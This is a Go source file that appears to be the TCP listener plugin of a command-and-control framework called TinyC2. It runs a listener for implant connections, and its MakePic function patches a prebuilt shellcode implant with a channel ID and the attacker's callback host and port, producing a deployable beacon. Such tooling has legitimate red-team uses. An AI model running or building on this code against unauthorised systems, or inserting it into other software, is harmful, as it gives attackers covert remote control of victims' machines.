package listener

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"sync"

	"github.com/0xPrimo/TinyC2/sdk"

	"github.com/goccy/go-yaml"
)

type TcpListener struct {
	Name   string
	Engine sdk.IEngine
	Config TcpConfig

	listener net.Listener
	wg       sync.WaitGroup
	quit     chan struct{}
	stopOnce sync.Once
}

type TcpConfig struct {
	ConnHost string `yaml:"connhost"`
	ConnPort string `yaml:"connport"`
	BindHost string `yaml:"bindhost"`
	BindPort string `yaml:"bindport"`
}

func NewTcpListener(engine sdk.IEngine, name string, config string) (sdk.IListener, error) {
	data, err := os.ReadFile(config)
	if err != nil {
		return nil, err
	}

	var cfg TcpConfig
	if err := yaml.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}

	return &TcpListener{
		Name:   name,
		Engine: engine,
		Config: cfg,
	}, nil
}

func (t *TcpListener) Start() error {
	addr := t.Config.BindHost + ":" + t.Config.BindPort
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", addr, err)
	}
	t.listener = ln

	t.wg.Add(1)
	go t.acceptLoop()

	return nil
}

func (t *TcpListener) acceptLoop() {
	defer t.wg.Done()

	for {
		conn, err := t.listener.Accept()
		if err != nil {
			if errors.Is(err, net.ErrClosed) {
				return
			}

			// Handle other unexpected accept errors
			log.Printf("Error accepting connection: %v\n", err)
			continue
		}

		t.wg.Add(1)
		go TcpHandler(t, conn)
	}
}

func (t *TcpListener) Stop() error {
	t.listener.Close()
	return nil
}

func (t *TcpListener) MakePic(id uint32) ([]byte, error) {
	// read plugin pic
	data, err := os.ReadFile("plugins/tcp/bin/channel.x64.pic")
	if err != nil {
		return nil, fmt.Errorf("failed to read pic: %w", err)
	}

	// patch channel id
	offset := bytes.Index(data, []byte("LSID"))
	if offset == -1 {
		return nil, fmt.Errorf("string 'LSID' not found in pic")
	}
	binary.LittleEndian.PutUint32(data[offset:offset+4], id)

	// patch host
	offset = bytes.Index(data, []byte("123.123.123.123"))
	if offset == -1 {
		return nil, fmt.Errorf("string '123.123.123.123' not found in pic")
	}
	copy(data[offset:offset+len(t.Config.ConnHost)], []byte(t.Config.ConnHost))
	data[offset+len(t.Config.ConnHost)] = 0

	// patch port
	offset = bytes.Index(data, []byte("PORT"))
	if offset == -1 {
		return nil, fmt.Errorf("string 'PORT' not found in pic")
	}

	num, _ := strconv.ParseUint(t.Config.ConnPort, 10, 16)
	binary.LittleEndian.PutUint16(data[offset:offset+2], uint16(num))

	// return pic
	return data, nil
}

func IsValidAddress(address string) error {
	listener, err := net.Listen("tcp", address)
	if err != nil {
		return err
	}

	_ = listener.Close()
	return nil
}
